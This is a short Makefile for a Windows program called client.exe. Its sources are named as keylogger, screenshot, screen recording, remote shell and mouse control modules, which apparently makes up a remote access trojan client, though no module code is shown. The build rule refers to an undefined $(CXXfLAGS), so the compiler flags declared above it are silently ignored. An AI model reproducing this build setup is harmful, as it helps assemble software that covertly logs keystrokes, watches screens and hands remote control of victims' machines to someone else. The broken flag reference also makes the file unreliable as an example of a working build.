CXX = g++
CXXFLAGS := -std=c++17 -Wall -O2 -I. -MMD -MP

LDLIBS = -lws2_32 -lgdiplus -lgdi32 -lole32

SRCS = client.cpp \
        modules/codes/module.cpp \
        modules/codes/ss_module.cpp \
        modules/codes/keylogger_module.cpp \
        modules/codes/screen_recording_module.cpp \
        modules/codes/remote_shell_module.cpp \
        modules/codes/mouse_control.cpp

TARGET = client.exe

all:
	$(CXX) $(CXXfLAGS) $(SRCS) -o $(TARGET) $(LDLIBS)

clean:
	rm -f $(TARGET)